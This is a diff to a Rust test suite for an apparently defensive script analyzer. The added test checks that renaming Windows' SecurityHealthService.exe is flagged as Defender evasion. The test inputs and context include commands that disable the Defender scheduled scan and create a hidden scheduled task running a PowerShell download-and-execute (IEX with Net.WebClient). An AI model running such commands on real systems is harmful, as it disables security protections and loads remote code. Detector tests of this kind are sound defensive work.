@@ -2689,6 +2689,24 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn defender_security_binary_move_rename_emits_evasion_trait() {
+        let script = b"@echo off\r\n\
+            move C:\\Windows\\System32\\SecurityHealthService.exe C:\\Windows\\System32\\SecurityHealthService.bak\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "security-binary-rename"
+                        && target == "SecurityHealthService.exe"
+            )),
+            "security binary move/rename was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn defender_scheduled_task_disable_emits_evasion_trait() {
         let script = b"@echo off\r\n\
             schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable\r\n\
